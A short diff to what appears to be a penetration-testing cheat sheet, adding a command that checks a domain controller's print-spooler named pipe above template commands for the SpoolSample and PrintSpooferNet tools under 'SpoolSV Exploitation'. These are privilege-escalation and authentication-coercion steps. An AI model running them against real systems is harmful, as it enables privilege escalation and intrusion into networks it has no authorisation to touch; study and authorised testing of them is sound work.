@@ -2,6 +2,8 @@
 
 ## SpoolSV Exploitation
 ```powershell
+ls \\dc03\pipe\spoolss
+
 SpoolSample.exe [Host Machine] [Target Pipe] <appsrv01\test>
 PrintSpooferNet.exe [Target Pipe] <\\.\pipe\test\pipe\spoolss>
 ```
